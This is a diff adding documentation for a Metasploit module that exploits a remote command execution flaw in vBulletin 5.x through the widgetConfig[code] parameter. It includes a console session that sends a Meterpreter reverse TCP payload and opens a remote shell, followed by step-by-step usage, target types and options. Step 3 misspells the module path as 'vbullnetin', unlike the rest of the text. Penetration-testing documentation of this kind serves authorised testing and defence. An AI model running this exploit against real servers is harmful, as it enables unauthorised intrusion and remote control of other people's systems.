@@ -1,0 +1,61 @@
+## Introduction
+
+vBulletin 5.x through 5.5.4 allows remote command execution via the `widgetConfig[code]` parameter in an `ajax/render/widget_php` `routestring` `POST` request.
+
+A proof of concept was originally published on [seclist.org](https://seclists.org/fulldisclosure/2019/Sep/31).
+
+```
+msf5 exploit(multi/http/vbulletin_widgetconfig_rce) > set rhosts 192.168.1.25
+rhosts => 192.168.1.25
+msf5 exploit(multi/http/vbulletin_widgetconfig_rce) > set lhost 192.168.1.13
+lhost => 192.168.1.13
+msf5 exploit(multi/http/vbulletin_widgetconfig_rce) > run
+
+[*] Started reverse TCP handler on 192.168.1.13:4444 
+[*] Sending php/meterpreter/reverse_tcp command payload
+[*] Sending stage (38288 bytes) to 192.168.1.25
+[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.25:35772) at 2019-10-18 13:53:39 +0400
+
+meterpreter > 
+```
+
+## Verification Steps
+
+1. Install the module as usual
+2. Start msfconsole
+3. Do: `use exploit/multi/http/vbullnetin_widgetconfig_rce`
+4. Do: `set RHOSTS [IP]`
+5. Do: `set LHOST [IP]`
+6. Do: `run`
+
+## Targets
+
+```
+  Id  Name
+  --  ----
+  0   Automatic (Dropper)
+  1   Linux (Stager)
+  2   Windows (Stager)
+  3   Unix (In-Memory)
+  4   Windows (In-Memory)
+```
+
+## Options
+
+**PHP_CMD**
+
+Specify the PHP function in which you want execute the payload. Default: shell_exec
+
+**TARGETURI**
+
+The base URI path of vBulletin. Default: /
+
+## Advanced options
+
+**ForceExploit**
+
+Override check result.
+
+## References
+
+  1. <https://seclists.org/fulldisclosure/2019/Sep/31>
